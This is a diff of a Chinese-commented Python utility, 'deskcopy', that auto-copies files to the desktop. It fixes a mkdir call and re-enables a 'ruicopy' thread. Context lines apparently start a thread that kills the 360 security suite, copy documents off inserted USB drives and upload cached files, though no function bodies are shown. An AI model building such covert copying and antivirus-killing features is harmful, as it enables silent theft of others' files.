@@ -1,6 +1,6 @@
 #Copyright Bail 2022-2024
-#deskcopy 桌面拖入文件自动复制 v1.12.3.2_79
-#2022.11.18-2024.1.21
+#deskcopy 桌面拖入文件自动复制 v1.12.3.3_80
+#2022.11.18-2024.2.5
 
 TARGET = 'D:\\desktop'  #复制目标
 LOGFILE = 'D:\\desktop\\deskcopy.log'    #日志文件
@@ -13,7 +13,6 @@ NOT_UPGRADE_FILE = r'D:\deskcopy\noup'  #禁用自动更新信号
 NEED_UPLOAD_FILE = r'D:\deskcopy\need_upload'   #上传信号
 DAILY_DIR_FILE = r'D:\deskcopy\dailydir'    #每日文件夹位置
 UPANCOPY_ALLOW_SUFFIX = ('.doc','.docx','.ppt','.pptx','.pdf')  #U盘复制时允许的后缀名
-TEMPCOPY_ALLOW_SUFFIX = ('.pdf',)   #temp目录复制时允许的后缀名
 UPANCOPY_ARGV = '--upan' #U盘全盘复制触发选项
 OPENCOPY_ARGV = '--open'    #打开复制触发选项
 STRFTIME = '%Y.%m.%d %H:%M:%S'  #格式化时间格式
@@ -201,7 +200,7 @@ def create_daily_dir():
     '''创建每日文件夹'''
     daily_dir = os.path.join(TARGET,time.strftime('%Y.%m.%d'))
     if (not os.path.exists(DAILY_DIR_FILE)) or (get_daily_dir() != daily_dir):
-        os.path.mkdir(daily_dir)
+        os.mkdir(daily_dir)
         with open(DAILY_DIR_FILE,'w') as f:
             f.write(daily_dir)
         log('I','已创建今日文件夹')
@@ -220,7 +219,7 @@ def main():
     threading.Thread(target=kill360).start()
     threading.Thread(target=auto_upgrade).start()
     threading.Thread(target=upload_cached_files).start()
-##    threading.Thread(target=ruicopy).start()
+    threading.Thread(target=ruicopy).start()
     threading.Thread(target=openupan).start()
     deskcopy()
     return 0
